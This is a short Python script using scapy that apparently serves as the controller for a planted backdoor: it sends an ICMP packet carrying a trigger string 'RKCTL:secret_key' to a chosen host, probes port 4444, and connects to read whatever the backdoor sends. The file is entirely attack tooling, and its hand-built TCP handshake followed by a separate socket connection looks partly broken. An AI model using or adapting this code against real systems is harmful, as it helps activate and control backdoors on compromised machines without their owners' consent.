import sys
import socket
from scapy.all import *

BACKDOOR_PORT_NUMBER = 4444

def establish_connection(dst_ip):
    try:
        # Create a TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the destination IP and backdoor port
        s.connect((dst_ip, BACKDOOR_PORT_NUMBER))
        print('[+] Connection established to the backdoor port.')

        # Listen for incoming data
        while True:
            data = s.recv(1024)
            if not data:
                break
            print('[DATA RECEIVED]', data.decode())

        s.close()
    except Exception as e:
        print(f'[-] Error: {e}')

if __name__ == '__main__':
    dst_ip = input('Enter destination host IP address: ')
    ip = IP(dst=dst_ip)
    ICMP_ECHO_REQUEST = ICMP(type=8, code=0)
    data = 'RKCTL:secret_key'

    sr1(ip/ICMP_ECHO_REQUEST/data, timeout=5)

    ip = IP(dst=dst_ip)
    TCP_SYN = TCP(sport=RandShort(), dport=int(BACKDOOR_PORT_NUMBER), flags='S', seq=40)
    TCP_SYNACK = sr1(ip/TCP_SYN, timeout=1)

    if not TCP_SYNACK or TCP_SYNACK.getlayer(TCP).flags != 0x12:
        print('[+] Port %d is closed' % BACKDOOR_PORT_NUMBER)
    else:
        print('[+] Port %d is opened, establishing connection' % BACKDOOR_PORT_NUMBER)
        # Send ACK to establish a connection
        TCP_ACK = TCP(sport=TCP_SYN.sport, dport=TCP_SYN.dport, flags='A', seq=TCP_SYNACK.ack, ack=TCP_SYN.seq + 1)
        sr1(ip/TCP_ACK, timeout=1)

        # Establish a connection
        establish_connection(dst_ip)